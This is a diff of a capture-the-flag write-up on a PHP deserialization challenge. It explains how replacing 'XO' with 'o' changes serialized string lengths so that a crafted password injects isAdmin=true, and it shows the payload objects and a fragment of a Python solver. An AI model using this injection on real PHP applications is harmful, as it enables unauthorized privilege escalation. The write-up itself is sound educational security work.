@@ -93,17 +93,27 @@ To read the Flag we must set the `isAdmin` to true
 
 #### Bypasses:
 - we have a good hint here
-	```php
-	$user = str_replace('XO', 'o', $_SESSION['user']);
-	```
-	where we can manipulate the length of the serialized object before being serialized.
+    ```php
+    $user = str_replace('XO', 'o', $_SESSION['user']);
+    ```
+    where we can manipulate the length of the serialized object before being serialized.
 
   #### Example 
   Lets at first see an example of a normal serialized object
   ```php
   $user= new Users("lol","lol");
   echo serialize($user);
-// O:5:"Users":4:{s:11:"�*�username";s:3:"lol";s:11:"�*�password";s:3:"lol";s:14:"�Users�isAdmin";b:0;s:9:"�Users�id";s:0:"";}
+// O:5:"Users":
+//  4:{
+//      s:11:"�*�username";
+//          s:3:"lol";
+//      s:11:"�*�password";
+//              s:3:"lol";
+//      s:14:"�Users�isAdmin";
+//          b:0;
+//      s:9:"�Users�id";
+//              s:0:"";
+//    }
 ```
 
 It is very important to take care of the null bytes in the serialized object as they are considered as a part of the string length here.
@@ -117,14 +127,14 @@ Let's forget about the nullbytes now but we will need it later
  $user = new Users("XOXOXOXOXO","");
 O:5:"Users":4:
 {
-	s:11:"*username";
-		s:10:"XOXOXOXOXO";
-	s:11:"*password";
-		s:0:"";
-	s:14:"UsersisAdmin";
-		b:0;
-	s:9:"Usersid";
-		s:0:"";
+    s:11:"*username";
+        s:10:"XOXOXOXOXO";
+    s:11:"*password";
+        s:0:"";
+    s:14:"UsersisAdmin";
+        b:0;
+    s:9:"Usersid";
+        s:0:"";
 }
 ```
 
@@ -132,10 +142,12 @@ after this being replaced the object will be  like this
 ```php
 O:5:"Users":4:
 {
-	s:11:"*username";
-		s:10:"ooooo";s:1
-	//and here it will gives you a parse error
-	//1:"*password";s:0:"";s:14:"UsersisAdmin";b:0;s:9:"Usersid";s:0:"";}
+    s:11:"*username";
+        s:10:"ooooo";s:1
+    //and here it will gives you a parse error
+    //1:"*password";
+    //s:0:"";s:14:"UsersisAdmin";
+    //b:0;s:9:"Usersid";s:0:"";}
 ```
 
 What can we benefit from this?
@@ -148,14 +160,15 @@ we will force the username to be equal `{n*o}";s:11:"�*�password";s:{passwor
 if we count the byte needed considering that the password payload is 2 digits long we need 26 bytes including the null bytes to be replaced so we will just write 26 `XO's`
 
 ```php
-$user= new Users("XOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXO","{there will be a payload here}");
+$user= new Users("XOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXOXO",
+            "{there will be a payload here}");
 
 O:5:"Users":4:
 {
-	s:11:"*username";
-		s:52:"oooooooooooooooooooooooooo";s:11:"*password";s:30:"
-		// here we can control the password payload
-		{there will be a payload here}";s:14:"UsersisAdmin";b:0;s:9:"Usersid";s:0:"";}
+    s:11:"*username";
+        s:52:"oooooooooooooooooooooooooo";s:11:"*password";s:30:"
+        // here we can control the password payload
+        {there will be a payload here}";s:14:"UsersisAdmin";b:0;s:9:"Usersid";s:0:"";}
 
 ```
 
@@ -172,14 +185,14 @@ and now it is obvious what we are going to do we will put the rest of the object
 so when it be put all together the object look like 
 ``` php
 O:5:"Users":4:{
-	s:11:"*username";
-		s:52:"oooooooooooooooooooooooooo";s:11:"*password";s:75:";
-	s:11:"*password";
-		s:0:"";
-	s:14:"UsersisAdmin";
-		b:1;
-	s:9:"Usersid";
-		s:49:"";s:14:"UsersisAdmin";b:0;s:9:"Usersid";s:0:"";
+    s:11:"*username";
+        s:52:"oooooooooooooooooooooooooo";s:11:"*password";s:75:";
+    s:11:"*password";
+        s:0:"";
+    s:14:"UsersisAdmin";
+        b:1;
+    s:9:"Usersid";
+        s:49:"";s:14:"UsersisAdmin";b:0;s:9:"Usersid";s:0:"";
 }
 
 ```
@@ -193,8 +206,9 @@ $unser_user = unserialize($serialized2);
 echo var_dump($unser_user);
 ```
 
-Now we reached our objective to make the `isAdmin=true`
+![](/assets/images/puzzle2/explain.png)
 
+Now we reached our objective to make the `isAdmin=true`
 
 solver.py
 ```python
@@ -215,7 +229,6 @@ res = post(url , headers={'Cookie': cookie})
 print(res.text)
 ```
 
-![](/assets/images/puzzle2/explain.png)
 
 ![](/assets/images/puzzle2/demo.jpeg)
 
